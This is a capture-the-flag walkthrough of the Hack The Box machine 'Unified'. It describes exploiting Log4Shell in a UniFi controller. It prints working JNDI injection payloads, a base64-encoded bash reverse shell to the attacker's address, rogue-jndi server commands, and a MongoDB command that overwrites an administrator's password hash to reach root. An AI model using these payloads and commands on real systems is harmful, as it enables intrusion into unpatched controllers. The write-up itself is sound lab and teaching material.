@@ -1,0 +1,342 @@
+---
+title: "Unified — UniFi Network Log4Shell to Root"
+description: "A Ubiquiti UniFi controller vulnerable to Log4Shell: confirm the callback with tcpdump, deliver a reverse shell through rogue-jndi, then flip an admin password hash in UniFi's internal MongoDB to reach the SSH settings and root."
+date: "2026-11-19"
+difficulty: "Hard"
+published: true
+---
+
+# Unified — UniFi Network Log4Shell to Root
+
+> A Ubiquiti UniFi controller vulnerable to Log4Shell: confirm the callback with tcpdump, deliver a reverse shell through rogue-jndi, then flip an admin password hash in UniFi's internal MongoDB to reach the SSH settings and root.
+
+---
+
+## Machine Information
+
+| | |
+|---|---|
+| **Name** | Unified |
+| **Platform** | Hack The Box |
+| **Difficulty** | Hard |
+| **OS** | Linux (Ubuntu) |
+| **Attack vector** | CVE-2021-44228 (Log4Shell) in the UniFi login `remember` parameter |
+| **Key services** | `22/tcp` SSH, `8443/tcp` UniFi Network 6.4.54, `27117/tcp` internal MongoDB |
+
+The box lives up to its name: everything needed to root it is inside one UniFi controller, from the initial JNDI injection to the SSH keys stored in its own database.
+
+---
+
+## Attack Path
+
+1. Enumerate ports and identify UniFi Network 6.4.54 on `8443/tcp`.
+2. Inject a Log4Shell probe into the `remember` field of `POST /api/login` and watch for an LDAP callback.
+3. Stand up `rogue-jndi` to serve a Tomcat `ELProcessor` payload and catch a reverse shell as `unifi`.
+4. Read `user.txt` from `/home/michael`.
+5. Query UniFi's bound-to-localhost MongoDB on port `27117`, dump the admin `x_shadow` hash, and overwrite it with a known hash.
+6. Log in to UniFi as `administrator`, read the root password from **Settings → Site → SSH Authentication**, and SSH in as root.
+
+---
+
+## 1. Recon
+
+A full TCP scan with default scripts and version detection:
+
+```bash
+nmap -p- -sC -sV 10.129.96.149
+```
+
+```text
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-19 03:07 EST
+Nmap scan report for 10.129.96.149
+Host is up (0.0082s latency).
+Not shown: 65529 closed tcp ports (conn-refused)
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http            Apache Tomcat (language: en)
+|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
+|_http-open-proxy: Proxy might be redirecting requests
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+| http-title: UniFi Network
+|_Requested resource was /manage/account/login?redirect=%2Fmanage
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+8843/tcp open  ssl/http        Apache Tomcat (language: en)
+|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
+8880/tcp open  http            Apache Tomcat (language: en)
+|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+The `8443` certificate names `UniFi` / Ubiquiti, and the redirect lands on `/manage/account/login`. Visiting the page confirms **UniFi Network 6.4.54** — a version affected by Log4Shell.
+
+![UniFi Network 6.4.54 login page](/images/writeups/hackthebox/unified-unifi-login.png)
+
+A quick password attempt is rejected, which is expected — this box is about injection, not credential guessing.
+
+![Failed login attempt against the UniFi controller](/images/writeups/hackthebox/unified-failed-login.png)
+
+---
+
+## 2. The automated PoC fails
+
+The well-known `log4j-shell-poc` script is the obvious first try:
+
+```bash
+cd Downloads/
+ls
+# poc.py  requirements.txt
+
+pip install -r requirements.txt
+python3 poc.py --userip 10.129.96.149 --webport 8443 --lport 9001
+```
+
+```text
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+
+Traceback (most recent call last):
+  ...
+  File "/home/xzdreamer/Downloads/poc.py", line 86, in check_java
+    exit_code = subprocess.call([
+        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
+        '-version',
+    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+FileNotFoundError: [Errno 2] No such file or directory: '/home/xzdreamer/Downloads/jdk1.8.0_20/bin/java'
+```
+
+The exploit script hardcodes a bundled JDK that is not present in this download. Rather than fixing its layout, I reproduce the attack by hand — which also makes each step visible.
+
+---
+
+## 3. Confirming Log4Shell with an LDAP callback
+
+Proxy the browser through Burp and send a login attempt. The interesting parameter is `"remember": false` in the JSON body of `POST /api/login`.
+
+![Burp HTTP history showing the POST /api/login request and its JSON body](/images/writeups/hackthebox/unified-burp-http-history.png)
+
+Before injecting anything, start a listener for LDAP traffic on `tun0`:
+
+```bash
+sudo tcpdump -i tun0 port 389
+```
+
+And grab the local VPN address to embed in the payload:
+
+```bash
+ip addr
+# 4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 ...
+#     inet 10.10.15.192/23 scope global tun0
+```
+
+Replace the `remember` value with a JNDI probe pointing back at that address:
+
+```json
+{
+  "username": "root",
+  "password": "password",
+  "remember": "${jndi:ldap://10.10.15.192/test}",
+  "strict": true
+}
+```
+
+![Burp Repeater with the Log4Shell probe in the remember field](/images/writeups/hackthebox/unified-jndi-test-payload.png)
+
+The response is an error (`api.err.InvalidPayload`), but that doesn't matter — the important evidence is in tcpdump:
+
+```text
+03:22:55.972368 IP 10.129.96.149.38432 > 10.10.15.192.ldap: Flags [S], seq 2345850386, win 64240, options [mss 1362,sackOK,TS val 1911534991 ecr 0,nop,wscale 7], length 0
+03:22:55.972403 IP 10.10.15.192.ldap > 10.129.96.149.38432: Flags [R.], seq 0, ack 2345850387, win 0, length 0
+```
+
+The target initiated a TCP connection back to port 389. Log4Shell is confirmed and reachable without authentication.
+
+<Callout type="tip" title="A 400 Is Not a Failure Here">
+  The application rejects the malformed login and returns HTTP 400 either way. What proves the vulnerability is the **outbound SYN** from the target to your listener, not the HTTP response body.
+</Callout>
+
+---
+
+## 4. Serving the payload with rogue-jndi
+
+Java and Maven are already available:
+
+```bash
+java --version
+# openjdk 25.0.2 2026-01-20
+
+mvn -v
+# Apache Maven 3.9.9
+```
+
+Build the reverse-shell command and base64-encode it so it survives the JNDI command string:
+
+```bash
+echo 'bash -c "bash -i >/dev/tcp/10.10.15.192/4444 0>&1"' | base64
+# YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTUuMTkyLzQ0NDQgMD4mMSIK==
+```
+
+Clone and build `rogue-jndi`:
+
+```bash
+git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi
+mvn package
+```
+
+![Cloning the rogue-jndi repository](/images/writeups/hackthebox/unified-rogue-jndi-clone.png)
+
+![Packaging rogue-jndi with Maven](/images/writeups/hackthebox/unified-rogue-jndi-build.png)
+
+![Maven BUILD SUCCESS](/images/writeups/hackthebox/unified-rogue-jndi-success.png)
+
+Start the LDAP/HTTP server with the encoded command:
+
+```bash
+java -jar target/RogueJndi-1.1.jar \
+  --command "bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTUuMTkyLzQ0NDQgMD4mMSIK==}|{base64,-d}|{bash,-i}" \
+  --hostname "10.10.15.192"
+```
+
+```text
++-+-+-+-+-+-+-+-+-+
+|R|o|g|u|e|J|n|d|i|
++-+-+-+-+-+-+-+-+-+
+Starting HTTP server on 0.0.0.0:8000
+Starting LDAP server on 0.0.0.0:1389
+Mapping ldap://10.10.15.192:1389/o=tomcat to artsploit.controllers.Tomcat
+...
+Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
+```
+
+Update the Burp request to point at the Tomcat controller endpoint:
+
+```json
+"remember": "${jndi:ldap://10.10.15.192:1389/o=tomcat}"
+```
+
+![Burp Repeater with the o=tomcat JNDI payload](/images/writeups/hackthebox/unified-jndi-tomcat-payload.png)
+
+With a netcat listener waiting, send the request:
+
+```bash
+nc -lvp 4444
+```
+
+```text
+Listening on 0.0.0.0 4444
+Connection received on 10.129.96.149 50998
+whoami
+unifi
+```
+
+We have a shell as the `unifi` service account.
+
+![The UniFi application returns 400 Bad Request after processing the payload](/images/writeups/hackthebox/unified-bad-request.png)
+
+<Callout type="tip" title="Stabilising the shell">
+  The spawned shell is not fully interactive. Upgrade it with:
+  ```bash
+  script /dev/null -c bash
+  ```
+</Callout>
+
+---
+
+## 5. User flag
+
+The UniFi controller runs its own MongoDB, bound to localhost:
+
+```bash
+ps aux | grep mongo
+# unifi  66  0.2  4.2 1103744 85524 ?  Sl  07:52  0:26 bin/mongod --dbpath /usr/lib/unifi/data/db \
+#        --port 27117 ... --bind_ip 127.0.0.1
+```
+
+There is a home directory for `michael` with the user flag:
+
+```bash
+unifi@unified:/usr/lib/unifi$ ls /home
+michael
+unifi@unified:/home/michael$ cat user.txt
+6ced…a127
+```
+
+---
+
+## 6. Privilege escalation — rewriting the admin hash
+
+Query the `admin` collection in the `ace` database:
+
+```bash
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+```
+
+The first record is the controller administrator, alongside accounts for `michael`, `seamus`, `warren` and `james`. Each has an `x_shadow` SHA-512 hash, plus a large `ui_settings` blob that is irrelevant here.
+
+![MongoDB dump showing the administrator account and its x_shadow hash](/images/writeups/hackthebox/unified-mongo-admin-hashes.png)
+
+```json
+{
+  "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+  "name" : "administrator",
+  "email" : "administrator@unified.htb",
+  "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+  "time_created" : NumberLong(1640900495),
+  "last_site_name" : "default"
+}
+```
+
+Cracking that hash is unnecessary — the `unifi` account can write to its own database. Generate a SHA-512 hash for a password we know and replace the administrator's:
+
+```bash
+mkpasswd -m sha-512 Password1234
+# $6$D5TygEj8FLBdj2on$eoUdlW/VNfl3kdjLLoiag2eeC/Us2ykP4KYhTC91z5fvdZ/RckO7m5gdGRyjxxOzsYpCcd8JPtPyjthw10EQd1
+
+mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")}, {$set: {"x_shadow": "$6$D5TygEj8FLBdj2on$eoUdlW/VNfl3kdjLLoiag2eeC/Us2ykP4KYhTC91z5fvdZ/RckO7m5gdGRyjxxOzsYpCcd8JPtPyjthw10EQd1"}})'
+```
+
+```text
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+```
+
+---
+
+## 7. Root
+
+Log in to the UniFi web interface with `administrator` / `Password1234`, then navigate to **Settings → Site** and scroll to the **SSH Authentication** section. The controller stores the root password in clear text there:
+
+```text
+NotACrackablePassword4U2022
+```
+
+SSH in as root and read `root.txt`:
+
+```bash
+ssh root@10.129.96.149
+# password: NotACrackablePassword4U2022
+cat /root/root.txt
+```
+
+Box pwned.
+
+---
+
+## Lessons Learned
+
+- **Log4Shell does not need a working exploit script.** The `log4j-shell-poc` tooling failed because of a missing bundled JDK, but the vulnerability itself was reachable with nothing more than Burp, a modified JSON field, and `tcpdump`.
+- **Trust the out-of-band signal, not the HTTP status.** The login endpoint returned `400` every time; the JNDI injection was proven by the LDAP SYN arriving on `tun0`.
+- **`rogue-jndi` needs a matching endpoint.** The generic `ldap://IP/test` probe only confirmed the callback; the Tomcat controller (`/o=tomcat`) was what delivered the `ELProcessor` payload and reverse shell.
+- **A service account is often a database administrator too.** The `unifi` user had full read/write access to the controller's MongoDB, which made cracking the hash unnecessary — replacing it was faster and deterministic.
+- **Application config is a credential store.** UniFi's SSH Authentication settings exposed the root password in plain text. Once you control the application's admin session, OS-level access is often one setting away.
+- **Watch for localhost-only databases.** Port `27117` never appeared in the external `nmap` scan. Enumerating running processes from inside the foothold (`ps aux | grep mongo`) is what revealed it.
